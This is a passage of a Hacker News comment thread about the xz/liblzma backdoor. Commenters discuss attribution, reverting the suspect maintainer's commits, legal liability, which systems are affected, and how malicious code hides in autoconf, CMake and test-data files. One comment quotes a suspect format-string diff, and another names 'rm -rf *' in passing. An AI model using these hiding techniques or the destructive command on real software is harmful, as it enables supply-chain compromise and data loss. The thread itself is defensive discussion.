well as to the rest of the world). > The percentage of maliciousness on the Internet is much higher. A baseless assumption. | | --- | --- | --- | | | |  |  | [richrichie](user?id=richrichie) [9 months ago](item?id=39875683)   | [root](#39866551) | [parent](#39873942) | [prev](#39916488) | [next](#39901607) [–]  Huh? The empirical evidence we have - thanks to Snowden leaks - paints a different picture. NSA is the biggest malicious actor with nearly unlimited resources at hand. They even insert hardware backdoors and intercept shipment to do that. | | --- | --- | --- | | | |  |  | [heresie-dabord](user?id=heresie-dabord) [9 months ago](item?id=39878639)   | [root](#39866551) | [parent](#39875683) | [next](#39901607) [–]  > NSA is the biggest malicious actor I'm curious, how do you rank CN, RU, and IR? | | --- | --- | --- | | | |  |  | [richrichie](user?id=richrichie) [9 months ago](item?id=39885013)   | [root](#39866551) | [parent](#39878639) | [next](#39901607) [–]  They are all active players, but no where close to the top dog. | | --- | --- | --- | | | |  |  | [rieter](user?id=rieter) [9 months ago](item?id=39901607)   | [root](#39866551) | [parent](#39873942) | [prev](#39875683) | [next](#39874191) [–]  That doesn't mean that the entire population of those countries is actively hostile to you. | | --- | --- | --- | | | |  |  | [tomthehero](user?id=tomthehero) [9 months ago](item?id=39874191)   | [root](#39866551) | [parent](#39873942) | [prev](#39901607) | [next](#39871140) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [heresie-dabord](user?id=heresie-dabord) [9 months ago](item?id=39875845)   | [root](#39866551) | [parent](#39874191) | [next](#39871140) [–]  > If you put it in other words You may of course choose whatever words you like. But your statement is nonsense, and the failures in the Middle East are *all humanity's fault*. The kakistocracies of CN, RU, and IR are not the feeble foes of democracy and capitalism that they were in the 20th century. | | --- | --- | --- | | | |  |  | [pizzafeelsright](user?id=pizzafeelsright) [9 months ago](item?id=39871140)   | [root](#39866551) | [parent](#39870331) | [prev](#39873942) | [next](#39870363) [–]  Huh. I never really thought of it as a percentage. I've been evil, been wonderful, and indifferent at different stages in life. I have known those who have done similar for money, fame, and boredom. I think, given a backstory, incentive, opportunity, and resources it would be possible to most people to flip from wouldn't to enlisted. Leverage has shown to be the biggest lever when it comes to compliance. | | --- | --- | --- | | | |  |  | [XorNot](user?id=XorNot) [9 months ago](item?id=39871348)   | [root](#39866551) | [parent](#39871140) | [next](#39871935) [–]  It's doubtful you've been evil, or at least, you are really lacking in imagination of the true scope of what that word implies. | | --- | --- | --- | | | |  |  | [saulpw](user?id=saulpw) [9 months ago](item?id=39871935)   | [root](#39866551) | [parent](#39871140) | [prev](#39871348) | [next](#39871853) [–]  "Assume that 3% of the people you encounter will act maliciously." | | --- | --- | --- | | | |  |  | [mlsu](user?id=mlsu) [9 months ago](item?id=39871853)   | [root](#39866551) | [parent](#39871140) | [prev](#39871935) | [next](#39870363) [–]  *The line between good and evil cuts through the heart of every person* | | --- | --- | --- | | | |  |  | [heresie-dabord](user?id=heresie-dabord) [9 months ago](item?id=39870363)   | [root](#39866551) | [parent](#39868499) | [prev](#39870331) | [next](#39874138) [–]  Threat actors create personas. We will need strong social trust to protect our important projects and dependencies. | | --- | --- | --- | | | |  |  | [hulitu](user?id=hulitu) [9 months ago](item?id=39874138)   | [root](#39866551) | [parent](#39867938) | [prev](#39868499) | [next](#39868152) [–]  > How many of people like this one exist? I guess every 3 letter agency has at least one. You can do the math. They havent't learned anything after Solar Winds. | | --- | --- | --- | | | |  |  | [tw04](user?id=tw04) [9 months ago](item?id=39868152)   | [parent](#39866551) | [prev](#39867938) | [next](#39867258) [–]  Honestly it seems like a state-based actor hoping to get whatever high value target compromised before it's made public. Reporting privately buys them more time, and allows them to let handlers know when the jig is up. | | --- | --- | --- | | | |  |  | [Aissen](user?id=Aissen) [9 months ago](item?id=39867258)   | [prev](#39866551) | [next](#39866305) [–]  Looks like one of the backdoor authors even went and disabled the feature the exploit relied on directly on oss-fuzz to prevent accidental discovery: [https://social.treehouse.systems/@Aissen/112180302735030319](https://social.treehouse.systems/%40Aissen/112180302735030319) <https://github.com/google/oss-fuzz/pull/10667> But luckily there was some serendipity: "I accidentally found a security issue while benchmarking postgres changes." [https://mastodon.social/@AndresFreundTec/112180083704606941](https://mastodon.social/%40AndresFreundTec/112180083704606941) | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39867658)   | [parent](#39867258) | [next](#39869609) [–]  This is getting addressed here: <https://github.com/google/oss-fuzz/issues/11760> | | --- | --- | --- | | | |  |  | [nialv7](user?id=nialv7) [9 months ago](item?id=39869609)   | [parent](#39867258) | [prev](#39867658) | [next](#39872839) [–]  This in of itself can be legitimate. ifunc has real uses and it indeed does not work when sanitizer is enabled. Similar change in llvm: [https://github.com/llvm/llvm-project/commit/1ef3de6b09f6b21a...](https://github.com/llvm/llvm-project/commit/1ef3de6b09f6b21a383fc7cf1ce1283df738015a) | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39873800)   | [root](#39867258) | [parent](#39869609) | [next](#39882027) [–]  Because of the exploit, so, why should we use configurations in production that were not covered by these tests? | | --- | --- | --- | | | |  |  | [lostmsu](user?id=lostmsu) [9 months ago](item?id=39882027)   | [root](#39867258) | [parent](#39869609) | [prev](#39873800) | [next](#39872839) [–]  Could that commit also be made by a bad actor? | | --- | --- | --- | | | |  |  | [throwaway290](user?id=throwaway290) [9 months ago](item?id=39872839)   | [parent](#39867258) | [prev](#39869609) | [next](#39866305) [–]  and that was in mid 2023. Very funny that Wikipedia on this issue says > It is unknown whether this backdoor was intentionally placed by a maintainer or whether a maintainer was compromised Yeah, if you've been compromised for a year your attacker is now your identity. Can't just wave hands, practice infosec hygiene | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39866305)   | [prev](#39867258) | [next](#39866307) [–]  I've long since said that if you want to hide something nefarious you'd do that in the GNU autoconf soup (and not in "curl | sh" scripts). Would be interesting to see what's going on here; the person who did the releases has done previous releases too (are they affected?) And has commits going back to 2022 – relatively recent, but not *that* recent. Many are real commits with real changes, and they have commits on some related projects like libarchive. Seems like a lot of effort just to insert a backdoor. *Edit*: anyone with access can add files to existing releases and it won't show that someone else added it (I just tested). However, the timestamp of the file will be to when you uploaded it, not that of the release. On xz all the timestamps of the files match with the timestamp of the release (usually the .tar.gz is a few minutes earlier, which makes sense). So looks like they were done by the same person who did the release. I suspected someone else might have added/altered the files briefly after the release before anyone noticed, but that doesn't seem to be the case. | | --- | --- | --- | | | |  |  | [bodyfour](user?id=bodyfour) [9 months ago](item?id=39867743)   | [parent](#39866305) | [next](#39866913) [–]  > I've long since said that if you want to hide something nefarious you'd do that in the GNU autoconf soup (and not in "curl | sh" scripts). Yeah, I've been banging on that same drum for ages too... for example on this very site a decade ago: <https://news.ycombinator.com/item?id=7213563> I'm honestly surprised that this autoconf vector hasn't happened more often... or more often that we know of. | | --- | --- | --- | | | |  |  | [pretzel5297](user?id=pretzel5297) [9 months ago](item?id=39872901)   | [root](#39866305) | [parent](#39867743) | [next](#39866913) [–]  Given that this was discovered by sheer luck, I'd expect way more such exploits in the wild. | | --- | --- | --- | | | |  |  | [eigenvalue](user?id=eigenvalue) [9 months ago](item?id=39866913)   | [parent](#39866305) | [prev](#39867743) | [next](#39868226) [–]  Every single commit this person ever did should immediately be rolled back in all projects. | | --- | --- | --- | | | |  |  | [gopher\_space](user?id=gopher_space) [9 months ago](item?id=39867062)   | [root](#39866305) | [parent](#39866913) | [next](#39869780) [–]  It's weird and disturbing that this isn't the default perspective. | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [9 months ago](item?id=39867805)   | [root](#39866305) | [parent](#39867062) | [next](#39868553) [–]  Well, it is much easier said than done. Philosophically I agree, but in the real world where you have later commits that might break and downstream projects, etc, it isn't very practical. It strikes me as in a similar vein to high school students and beauty pageant constestants calling for world peace. Really great goal, not super easy to implement. I would definitely be looking at every single commit though and if it isn't obviously safe I'd be drilling in. | | --- | --- | --- | | | |  |  | [concordDance](user?id=concordDance) [9 months ago](item?id=39868553)   | [root](#39866305) | [parent](#39867062) | [prev](#39867805) | [next](#39869046) [–]  Some of those commits might fix genuine vulnerabilities. So you might trade a new backdoor for an old vulnerability that thousands of criminal orgs have bots for exploiting. Damage wise, most orgs aren't going to be hurt much by NSA or the Chinese equivalent getting access, but a Nigerian criminal gang? They're far more likely to encrypt all your files and demand a ransom. | | --- | --- | --- | | | |  |  | [mysidia](user?id=mysidia) [9 months ago](item?id=39869386)   | [root](#39866305) | [parent](#39868553) | [next](#39869046) [–]  Still.. At this point the default assumption should be every commit is a vulnerability or facilitating a potential vulnerability. For example, change from safe\_fprintf to fprintf. It would be appropriate that every commit should be reviewed and either tweaked or re-written to ensure the task is being done in the safest way and doesn't have anything that is "off" or introducing a deviation from the way that codebase standardly goes about tasks within functions. | | --- | --- | --- | | | |  |  | [KeplerBoy](user?id=KeplerBoy) [9 months ago](item?id=39869897)   | [root](#39866305) | [parent](#39869386) | [next](#39869046) [–]  Surely this is happening right now. A lot of eyes are on the code. From all sides. Folks trying to find old unpatched backdoors to exploit or patch. | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39869046)   | [root](#39866305) | [parent](#39867062) | [prev](#39868553) | [next](#39871706) [–]  it's not weird at all? randomly reverting two years of things across dozens of repositories will break them, almost definitely make them unbuildable, but also make them unreleasable in case any other change needs to happen soon. all of their code needs to be audited to prove it shouldn't be deleted, of course, but that can't happen in the next ten minutes. I swear that HN has the least-thought-through hot takes of any media in the world. | | --- | --- | --- | | | |  |  | [ryanwaggoner](user?id=ryanwaggoner) [9 months ago](item?id=39871710)   | [root](#39866305) | [parent](#39869046) | [next](#39869772) [–]  \* I swear that HN has the least-thought-through hot takes of any media in the world.\* The irony is too good. | | --- | --- | --- | | | |  |  | [datascienced](user?id=datascienced) [9 months ago](item?id=39869772)   | [root](#39866305) | [parent](#39869046) | [prev](#39871710) | [next](#39871706) [–]  Yeah if you tried to revert stuff that was done weeks ago on a relatively small team you know how much painstaking work it can be. | | --- | --- | --- | | | |  |  | [kaliqt](user?id=kaliqt) [9 months ago](item?id=39871706)   | [root](#39866305) | [parent](#39867062) | [prev](#39869046) | [next](#39868546) [–]  You can't just go and rip out old code, it'll break everything else, you have to review each commit and decide what to do with each. | | --- | --- | --- | | | |  |  | [maerF0x0](user?id=maerF0x0) [9 months ago](item?id=39876172)   | [root](#39866305) | [parent](#39871706) | [next](#39868546) [–]  "immediately" could mean have humans swarm on the task and make a choice, as opposed to ```     for commit in author_commits         git revert $commit ``` | | --- | --- | --- | | | |  |  | [maxcoder4](user?id=maxcoder4) [9 months ago](item?id=39868546)   | [root](#39866305) | [parent](#39867062) | [prev](#39871706) | [next](#39872126) [–]  Imagine someone tried to revert all the commits you ever did. Doesn't sound easy. | | --- | --- | --- | | | |  |  | [crest](user?id=crest) [9 months ago](item?id=39872126)   | [root](#39866305) | [parent](#39867062) | [prev](#39868546) | [next](#39869780) [–]  Too much fallout. | | --- | --- | --- | | | |  |  | [neurostimulant](user?id=neurostimulant) [9 months ago](item?id=39869780)   | [root](#39866305) | [parent](#39866913) | [prev](#39867062) | [next](#39868098) [–]  Rolling back two years worth of commits made by a major contributor is going to be hell. I'm looking forward to see how they'll do this. | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39870041)   | [root](#39866305) | [parent](#39869780) | [next](#39868098) [–]  Not really. xz worked fine 2 years ago. Roll back to 5.3.1 and apply a fix for the 1 security hole that was fixed since that old version. (ZDI-CAN-16587) Slight oversimplification, see <https://bugs.debian.org/1068024> discussion. | | --- | --- | --- | | | |  |  | [kelseydh](user?id=kelseydh) [9 months ago](item?id=39914822)   | [root](#39866305) | [parent](#39870041) | [next](#39868098) [–]  This seems true with so many of these core libraries. Change for the sake of change introduces attack vectors. If it ain't broke, don't fix it! | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916583)   | [root](#39866305) | [parent](#39914822) | [next](#39868098) [–]  Yeah but people will cry "dead project" if there hasn't been a release for a week. | | --- | --- | --- | | | |  |  | [andruby](user?id=andruby) [9 months ago](item?id=39868098)   | [root](#39866305) | [parent](#39866913) | [prev](#39869780) | [next](#39872963) [–]  Hoe will you do that practically though? That’s probably thousands of commits upon which tens or hundred thousand commits from others were built. You can’t just rollback everything two years and expect it not to break or bring back older vulnerabilities that were patched in those commits. | | --- | --- | --- | | | |  |  | [kjs3](user?id=kjs3) [9 months ago](item?id=39869746)   | [root](#39866305) | [parent](#39868098) | [next](#39872963) [–]  Likely part of what the attacker(s) are counting on. Anyone want to place odds this isn't the only thing that's going to be found? | | --- | --- | --- | | | |  |  | [umanwizard](user?id=umanwizard) [9 months ago](item?id=39871115)   | [root](#39866305) | [parent](#39869746) | [next](#39872963) [–]  I’d bet you at even odds that nothing else malicious by this person is found in 1 month, and at 1:2.5 odds that nothing is found in a year. | | --- | --- | --- | | | |  |  | [kjs3](user?id=kjs3) [9 months ago](item?id=39879854)   | [root](#39866305) | [parent](#39871115) | [next](#39872963) [–]  Only if you consider "this person" to be equal to "this identity". | | --- | --- | --- | | | |  |  | [planb](user?id=planb) [9 months ago](item?id=39872963)   | [root](#39866305) | [parent](#39866913) | [prev](#39868098) | [next](#39868226) [–]  I don’t thinks that’s necessary: there are enough eyes on *this* person’s work now. | | --- | --- | --- | | | |  |  | [hcks](user?id=hcks) [9 months ago](item?id=39873082)   | [root](#39866305) | [parent](#39872963) | [next](#39868226) [–]  No one will do it seriously | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39868226)   | [parent](#39866305) | [prev](#39866913) | [next](#39867144) [–]  > they have commits on some related projects like libarchive Windows started using libarchive to support .rar, .7z, ... [https://arstechnica.com/gadgets/2023/05/cancel-your-winrar-t...](https://arstechnica.com/gadgets/2023/05/cancel-your-winrar-trial-windows-will-soon-support-rar-gz-7z-and-other-archives/) | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39867144)   | [parent](#39866305) | [prev](#39868226) | [next](#39867575) [–]  Couldn't the autoconf soup be generated from simpler inputs by the CI/CD system to avoid this kind of problem? Incomprehensible soup as a build artifact (e.g. executables) is perfectly normal, but it seems to me that such things don't belong in the source code. (This means you too, gradle-wrapper! And your generated wrapper for your generated wrapper. That junk is not source code and doesn't belong in the repo.) | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39867510)   | [root](#39866305) | [parent](#39867144) | [next](#39869510) [–]  Yes, it's usually regenerated already. However even the source is often pretty gnarly. And in general, the build system of a large project is doing a lot of work and is considered pretty uninteresting and obscure. Random CMake macros or shell scripts would be just as likely to host bad code. This is also why I like meson, because it's much more constrained than the others and the build system tends to be more modular and the complex parts split across multiple smaller, mostly independent scripts (written in Python or bash, 20-30 lines max). It's still complex, but I find it easier to organize. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869076)   | [root](#39866305) | [parent](#39867510) | [next](#39869510) [–]  > And in general, the build system of a large project is doing a lot of work and is considered pretty uninteresting and obscure. Random CMake macros or shell scripts would be just as likely to host bad code. Build systems can even have undefined behaviour in the C++ sense. For example Conan 2 has a whole page on that. | | --- | --- | --- | | | |  |  | [mysidia](user?id=mysidia) [9 months ago](item?id=39869510)   | [root](#39866305) | [parent](#39867144) | [prev](#39867510) | [next](#39871395) [–]  The other thing besides the autoconf soup is the XZ project contains incomprehensible binaries as "test data"; the "bad-3-corrupt\_lzma2.xz" part of the backdoor that they even put in the repo. It's entirely possible they could have got that injection through review, even if they had that framwork and instead put it in source files used to generate autoconf soup. | | --- | --- | --- | | | |  |  | [WatchDog](user?id=WatchDog) [9 months ago](item?id=39871395)   | [root](#39866305) | [parent](#39867144) | [prev](#39869510) | [next](#39867575) [–]  gradle-wrapper is just a convenience, you can always just build the project with an installed version of gradle. Although I get your point, it’s a great place to hide nefarious code. | | --- | --- | --- | | | |  |  | [AeroNotix](user?id=AeroNotix) [9 months ago](item?id=39867575)   | [parent](#39866305) | [prev](#39867144) | [next](#39866448) [–]  Pure speculation but my guess is a specific state actor *ahem* is looking for developers innocently working with open source to then strongarm them into doing stuff like this. | | --- | --- | --- | | | |  |  | [dec0dedab0de](user?id=dec0dedab0de) [9 months ago](item?id=39872098)   | [root](#39866305) | [parent](#39867575) | [next](#39873136) [–]  Or hiring them to do it for years without telling them why until they need a favor. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39873136)   | [root](#39866305) | [parent](#39867575) | [prev](#39872098) | [next](#39866448) [–]  many people are patriots of their countries. if state agency would approach them proposing to have paid OSS work and help their country to fight terrorism/dictatorships/capitalists/whatever-they-believe, they will feel like killing two birds with one job | | --- | --- | --- | | | |  |  | [kelseydh](user?id=kelseydh) [9 months ago](item?id=39914832)   | [root](#39866305) | [parent](#39873136) | [next](#39916647) [–]  While this seems plausible, it is notable that this person seems to be anonymous from the get go. Most open source maintainers are proud of their work and maintain publicly available personas. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916647)   | [root](#39866305) | [parent](#39873136) | [prev](#39914832) | [next](#39866448) [–]  While I don't doubt there are people who would gladly do this work for money/patriotism/whatever, adding a backdoor to your own project isn't really reconcilable with the motivations behind wanting to do OSS work. | | --- | --- | --- | | | |  |  | [sslayer](user?id=sslayer) [9 months ago](item?id=39866448)   | [parent](#39866305) | [prev](#39867575) | [next](#39866503) [–]  I would be curious if their commits could be analyzed for patterns that could then be used to detect commits from their other account | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867363)   | [root](#39866305) | [parent](#39866448) | [next](#39866984) [–]  One thing that is annoying is that many open source projects have been getting "garbage commits" apparently from people looking to "build cred" for resumes or such. Easier and easier to hide this junk in amongst them. | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39869050)   | [root](#39866305) | [parent](#39867363) | [next](#39866984) [–]  annoying ... and convenient for some! | | --- | --- | --- | | | |  |  | [carom](user?id=carom) [9 months ago](item?id=39866984)   | [root](#39866305) | [parent](#39866448) | [prev](#39867363) | [next](#39866503) [–]  There was a DARPA program on this topic called Social Cyber. [1] 1. [https://www.darpa.mil/program/hybrid-ai-to-protect-integrity...](https://www.darpa.mil/program/hybrid-ai-to-protect-integrity-of-open-source-code) | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39866503)   | [parent](#39866305) | [prev](#39866448) | [next](#39873736) [–]  I mean, a backdoor at this scale (particularly if it wasn't noticed for a while and got into stable distros) could be worth millions. Maybe hundreds of millions (think of the insider trading possibilities alone, not to mention espionage). 2 years doesn't seem like that much work relative to the potential pay off. This is the sort of case where america's over the top hacking laws make sense. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39867006)   | [root](#39866305) | [parent](#39866503) | [next](#39873736) [–]  And what law would you use to target someone who wrote some code and posted it for free on the internet that was willingly consumed? | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39867317)   | [root](#39866305) | [parent](#39867006) | [next](#39916669) [–]  The computer abuse and fraud act? Seems like a pretty easy question to answer. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39868544)   | [root](#39866305) | [parent](#39867317) | [next](#39916669) [–]  Maybe I'm miss understanding things, but it seems like anyone can publish an exploit on the internet without being a crime. In the same way encryption is free speech. It would seem unlikely this guy would be also logging into peoples boxes after this. It seems a much tougher job to link something like this to an intentional unauthorized access. At this point, we have no confirmed access via compromise. Do you know of a specific case where the existence of a backdoor has been prosecuted without a compromise? Who would have standing to bring this case? Anyone with a vulnerable machine? Someone with a known unauthorized access. Other maintainers of the repo? IANAL but it is unclear that a provable crime has been committed here | | --- | --- | --- | | | |  |  | [refulgentis](user?id=refulgentis) [9 months ago](item?id=39868997)   | [root](#39866305) | [parent](#39868544) | [next](#39869270) [–]  > IANAL Best to leave it at that. It's not worth your time or the reader's time trying to come up with a technicality to make it perfectly legal to do something we know little about, other than it's extremely dangerous. Law isn't code, you gotta violate some pretty bedrock principles to pull off something like this and get away with it. Yes, if you were just a security researcher experimenting on GitHub, it's common sense you should get away with it\*, and yes, it's hard to define a logical proof that ensnares this person, and not the researcher. \* and yes, we can come up with another hypothetical where the security researcher shouldn't get away with it. Hypotheticals all the way down. | | --- | --- | --- | | | |  |  | [amiga386](user?id=amiga386) [9 months ago](item?id=39875397)   | [root](#39866305) | [parent](#39868997) | [next](#39870323) [–]  I think this thread is talking at cross-purposes. 1. It should be legal to develop or host pen-testing/cracking/fuzzing/security software that can break other software or break into systems. It should be illegal to \_use\_ the software to gain \_unauthorised\_ access to others' systems. (e.g. it's legal to create or own lockpicks and use them on your own locks, or locks you've been given permission to pick. It's not legal to gain unauthorised access \_using\_ lockpicks) 2. It should be illegal to develop malware that \_automatically\_ gains unauthorised access to systems (trojans, viruses, etc.). However, it should be legal to maintain an archive of malware, limiting access to vetted researchers, so that it can be studied, reverse-engineered and combatted. (e.g. it's illegal to develop or spread a bioweapon, but it's ok for authorised people to maintain samples of a bioweapon in order to provide antidotes or discover what properties it has) 3. What happened today: It should be illegal to intentionally undermine the security of a project by making bad-faith contributions to it that misrepresent what they do... even if you're a security researcher. It could only possibly be allowed done if an agreement was reached in advance with the project leaders to allow such intentional weakness-probing, with a plan to reveal the deception and treachery. Remember when university researchers tried to find if LKML submissions could be gamed? They didn't tell the Linux kernel maintainers they were doing that. When the Linux kernel maintainers found out, they banned the entire university from making contributions and removed everything they'd done. <https://lkml.org/lkml/2021/4/21/454> [https://arstechnica.com/gadgets/2021/04/linux-kernel-team-re...](https://arstechnica.com/gadgets/2021/04/linux-kernel-team-rejects-university-of-minnesota-researchers-apology/) | | --- | --- | --- | | | |  |  | [refulgentis](user?id=refulgentis) [9 months ago](item?id=39875682)   | [root](#39866305) | [parent](#39875397) | [next](#39870323) [–]  Talking at cross-purposes? No, people being polite and avoiding the more direct answer that'd make people feel bad. The rest of us understand that intuitively, and that it is already the case, so pretending there was some need to work through it, at best, validates a misconception for one individual. Less important, as it's mere annoyance rather than infohazard: it's wildly off-topic. Legal hypotheticals where a security researcher released "rm -rf \*" on GitHub and ended up in legal trouble is 5 steps downfield even in this situation, and it is a completely different situation. Doubly so when everyone has to "IANAL" through the hypotheticals. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39884778)   | [root](#39866305) | [parent](#39875682) | [next](#39870323) [–]  I'm not looking for a loophole or a legal hypothetical, I'm wondering if our laws are keeping up, which they very often do not with tech. This is not unauthorized access, but is also clearly wrong. I'm wondering if its illegal, or if its unauthorized access . . . | | --- | --- | --- | | | |  |  | [SolarNet](user?id=SolarNet) [9 months ago](item?id=39870323)   | [root](#39866305) | [parent](#39868997) | [prev](#39875397) | [next](#39869270) [–]  And of course an attacker like this has a high likelihood of being a state actor, comfortably secure in their native jurisdiction. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39869270)   | [root](#39866305) | [parent](#39868544) | [prev](#39868997) | [next](#39872086) [–]  > but it seems like anyone can publish an exploit on the internet without being a crime Of course. The mere publishing of the exploit is not the criminal part. Its the manner & intent in which it was published that is the problem. > At this point, we have no confirmed access via compromise. While i don't know the specifics for this particular law, generally it doesn't matter what you actually did. What is relavent is what you *tried* to do. Lack of success doesn't make you innocent. > Who would have standing to bring this case? The state obviously. This is a criminal matter not a civil one. You don't even need the victim's consent to bring a case. [IANAL] | | --- | --- | --- | | | |  |  | [anticensor](user?id=anticensor) [9 months ago](item?id=39878385)   | [root](#39866305) | [parent](#39869270) | [next](#39872086) [–]  Some types of criminal cases are only pursued on a victim's complaint. | | --- | --- | --- | | | |  |  | [alwa](user?id=alwa) [9 months ago](item?id=39879544)   | [root](#39866305) | [parent](#39878385) | [next](#39872086) [–]  Not this kind! See for example page 35 in the Justice Department’s computer crimes handbook (dated, but basically AIUI the same way they still do things) [0] [0] [https://www.justice.gov/d9/criminal-ccips/legacy/2015/01/14/...](https://www.justice.gov/d9/criminal-ccips/legacy/2015/01/14/ccmanual_0.pdf) | | --- | --- | --- | | | |  |  | [dec0dedab0de](user?id=dec0dedab0de) [9 months ago](item?id=39872086)   | [root](#39866305) | [parent](#39868544) | [prev](#39869270) | [next](#39916669) [–]  By this logic you could say that leaving a poisoned can of food in a public pantry is not a crime because poison is legal for academic purposes, and whoever ate it took it willingly. Also, I think getting malicious code into a repo counts as a compromise in and of itself. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39879676)   | [root](#39866305) | [parent](#39872086) | [next](#39916669) [–]  Or shooting someone isn't a crime, since you only pulled the trigger. After all it was the bullet that killed them | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916669)   | [root](#39866305) | [parent](#39867006) | [prev](#39867317) | [next](#39874035) [–]  Similar laws we use to prosecute someone who intentionally brought a poisened cake to the potluck. | | --- | --- | --- | | | |  |  | [unethical\_ban](user?id=unethical_ban) [9 months ago](item?id=39874035)   | [root](#39866305) | [parent](#39867006) | [prev](#39916669) | [next](#39873736) [–]  Are you suggesting intent is impossible to determine? | | --- | --- | --- | | | |  |  | [WesolyKubeczek](user?id=WesolyKubeczek) [9 months ago](item?id=39873736)   | [parent](#39866305) | [prev](#39866503) | [next](#39869798) [–]  > I've long since said that if you want to hide something nefarious you'd do that in the GNU autoconf soup If I recall correctly, xz can be built with both autoconf and cmake, are cmake configs similarly affected? | | --- | --- | --- | | | |  |  | [amiga386](user?id=amiga386) [9 months ago](item?id=39875418)   | [root](#39866305) | [parent](#39873736) | [next](#39869798) [–]  Yes, there is evidence of sabotage on the CMake configs too. [https://git.tukaani.org/?p=xz.git;a=commit;h=f9cf4c05edd14de...](https://git.tukaani.org/?p=xz.git;a=commit;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00) | | --- | --- | --- | | | |  |  | [stabbles](user?id=stabbles) [9 months ago](item?id=39869798)   | [parent](#39866305) | [prev](#39873736) | [next](#39869301) [–]  How about wheels in the python ecosystem | | --- | --- | --- | | | |  |  | [IshKebab](user?id=IshKebab) [9 months ago](item?id=39869301)   | [parent](#39866305) | [prev](#39869798) | [next](#39866307) [–]  Yeah this was my first thought too. Though I think the case against autoconf is already so overwhelming I think anyone still using it is just irredeemable; this isn't going to persuade them. | | --- | --- | --- | | | |  |  | [bonyt](user?id=bonyt) [9 months ago](item?id=39866307)   | [prev](#39866305) | [next](#39872887) [–]  For those panicking, here are some key things to look for, based on the writeup: - A very recent version of liblzma5 - 5.6.0 or 5.6.1. This was added in the last month or so. If you're not on a rolling release distro, your version is probably older. - A debian or RPM based distro of Linux on x86\_64. In an apparent attempt to make reverse engineering harder, it does not seem to apply when built outside of deb or rpm packaging. It is also specific to Linux. - Running OpenSSH sshd from systemd. OpenSSH as patched by some distros only pulls in libsystemd for logging functionality, which pulls in the compromised liblzma5. Debian testing already has a version called '5.6.1+really5.4.5-1' that is really an older version 5.4, repackaged with a newer version to convince apt that it is in fact an upgrade. It is possible there are other flaws or backdoors in liblzma5, though. | | --- | --- | --- | | | |  |  | [pdw](user?id=pdw) [9 months ago](item?id=39868804)   | [parent](#39866307) | [next](#39866676) [–]  Focusing on sshd is the wrong approach. The backdoor was in liblzma5. It was discovered to attack sshd, but it very likely had other targets as well. The payload hasn't been analyzed yet, but \_almost everything\_ links to libzma5. Firefox and Chromium do. Keepassxc does. And it might have made arbitrary changes to your system, so installing the security update might not remove the backdoor. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39869961)   | [root](#39866307) | [parent](#39868804) | [next](#39874862) [–]  From what I'm understanding it's trying to patch itself into the symbol resolution step of ld.so specifically for libcrypto under systemd on x86\_64. Am I misreading the report? That's a strong indication it's targeting sshd specifically. | | --- | --- | --- | | | |  |  | [pdw](user?id=pdw) [9 months ago](item?id=39870087)   | [root](#39866307) | [parent](#39869961) | [next](#39882077) [–]  Lots of software links both liblzma and libcrypto. As I read Andres Freund's report, there is still a lot of uncertainty: "There's lots of stuff I have not analyzed and most of what I observed is purely from observation rather than exhaustively analyzing the backdoor code." "There are other checks I have not fully traced." | | --- | --- | --- | | | |  |  | [lostmsu](user?id=lostmsu) [9 months ago](item?id=39882077)   | [root](#39866307) | [parent](#39869961) | [prev](#39870087) | [next](#39874862) [–]  As mentioned many times in other places now, this account had control over xz code for 2 years. The discovered CVE might be just a tip of an iceberg. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874862)   | [root](#39866307) | [parent](#39868804) | [prev](#39869961) | [next](#39866676) [–]  It checks for argv[0] == "sshd" | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39866676)   | [parent](#39866307) | [prev](#39868804) | [next](#39867098) [–]  Ubuntu still ships 5.4.5 on 24.03 (atm). I did a quick diff of the source (.orig file from packages.ubuntu.com) and the content mostly matched the 5.4.5 github tag except for Changelog and some translation files. It does match the tarball content, though. So for 5.4.5 the tagged release and download on github differ. It does change format strings, e.g. ```    +#: src/xz/args.c:735    +#, fuzzy    +#| msgid "%s: With --format=raw, --suffix=.SUF is required unless writing to stdout"    +msgid "With --format=raw, --suffix=.SUF is required unless writing to stdout"    +msgstr "%s: amb --format=raw, --suffix=.SUF és necessari si no s'escriu a la sortida estàndard"  ``` There is no second argument to that printf for example. I think there is at least a format string injection in the older tarballs. [Edit] formatting | | --- | --- | --- | | | |  |  | [mort96](user?id=mort96) [9 months ago](item?id=39867517)   | [root](#39866307) | 